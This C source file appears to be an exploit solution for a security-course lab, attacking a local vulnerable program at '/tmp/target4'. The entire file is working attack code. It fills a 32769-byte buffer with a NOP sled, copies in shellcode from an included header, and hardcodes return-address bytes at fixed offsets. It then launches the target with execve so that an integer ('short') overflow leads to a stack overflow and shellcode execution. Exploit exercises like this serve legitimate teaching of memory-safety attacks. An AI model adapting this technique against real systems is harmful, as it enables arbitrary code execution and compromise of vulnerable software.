#include <stdio.h>             
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NOP 0x90
#define SIZE 32769

int main(void)
{
  char *args[3];
  char *env[1];

  // Overflow the short.
  char attack[SIZE];
  
  memset(attack, NOP, sizeof(attack));
  attack[32768] = '\0';
  attack[4019] = 0xbf;
  attack[4018] = 0xff;
  attack[4017] = 0x6e;
  attack[4016] = 0xff;

  memcpy(attack + 100, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
